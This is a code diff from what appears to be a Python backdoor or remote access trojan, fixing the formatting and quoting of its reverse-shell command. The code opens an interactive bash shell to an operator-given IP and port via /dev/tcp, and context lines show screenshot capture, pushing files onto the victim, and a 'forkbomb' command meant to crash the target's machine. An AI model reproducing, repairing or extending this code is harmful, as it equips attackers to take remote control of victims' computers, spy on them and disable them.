@@ -199,12 +199,10 @@ class Backdoor:
                         reverseip = message_command_descrypt.split(" ")[1]
                         reverseport = message_command_descrypt.split(" ")[2]
                         try:
-	                        subprocess.check_output(
-	                            f"""bash -i >& /dev/tcp/{reverseip}/{reverseport} 0>&1''
-	                        """, stderr=subprocess.STDOUT, shell=True)
-	                        self.sock.send("Reverse Shell Session established with sucess!".encode())
-	                    except:
-	                    	self.sock.send("Something went wrong! Maybe the target is a windows!".encode())
+                            subprocess.check_output(f"""bash -i >& /dev/tcp/{reverseip}/{reverseport} 0>&1""", stderr=subprocess.STDOUT, shell=True)
+                            self.sock.send("Reverse Shell Session established with sucess!".encode())
+                        except:
+                            self.sock.send("Something went wrong! Maybe the target is a windows!".encode())
                     # Sending Screenshot
 
                     if message_command_descrypt == "screenshot":
@@ -222,7 +220,7 @@ class Backdoor:
                     # Upload File ta executando como comando no termianl.. mudar para if, sel
 
                     if message_command_descrypt.startswith("upload "):
-                    
+
                         up_filesize = self.sock.recv(1024).decode("latin1")
                         up_filename = message_command_descrypt.split(" ")[2]
 
@@ -237,7 +235,7 @@ class Backdoor:
 
                         self.sock.send(
                             f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
-                
+
                     # This is for crash the target's machine
 
                     if message_command_descrypt == "forkbomb":
